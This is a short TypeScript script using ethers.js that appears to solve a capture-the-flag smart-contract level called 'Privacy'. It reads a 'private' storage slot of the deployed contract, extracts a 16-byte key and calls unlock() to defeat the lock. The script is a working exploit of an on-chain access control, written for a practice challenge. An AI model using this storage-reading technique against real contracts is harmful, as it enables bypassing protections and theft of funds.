import { decodeBytes32String, ethers } from "ethers";
import { Privacy, Privacy__factory } from "../typechain-types";
require('dotenv').config();

async function main() {
	const providerUrl = process.env.PROVIDER_URL;
	const provider = new ethers.JsonRpcProvider(providerUrl);

	const privacyAddress = "0xF309F5Ee4B64eF3bC4794387bbe97E72BDaA4Fa1";
	let slot = 5;
	const codedKey = await provider.getStorage(privacyAddress, slot);
	console.log(`Position: ${slot} -`, codedKey);
	const decodedKey = ethers.dataSlice(codedKey, 0, 16);
	console.log ("Key:", decodedKey);

	// 0x5468697320697320612062696720737472696e67000000000000000000000000
	// 0x54686973206973206120626967207374
  // 0xdde2fba7584ff6dd8a5807954fb07f80

	// Attach to privacy contract
	const wallet = new ethers.Wallet(process.env.PRIVATE_KEY ?? "", provider);
	const privacyFactory = new Privacy__factory(wallet);
	const privacyContract = privacyFactory.attach(privacyAddress) as Privacy;

	// Unlock privacy
	console.log("Unlocking privacy...");
	const unlockprivacy = await privacyContract.unlock(decodedKey);
	await unlockprivacy.wait();
	console.log("Tx hash:", unlockprivacy.hash, "\n");
	const checkprivacy = await privacyContract.locked();
	if (checkprivacy == false)
		console.log("Storage unlocked! B)");
	else
		console.log("Could not unlock storage! x(");
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
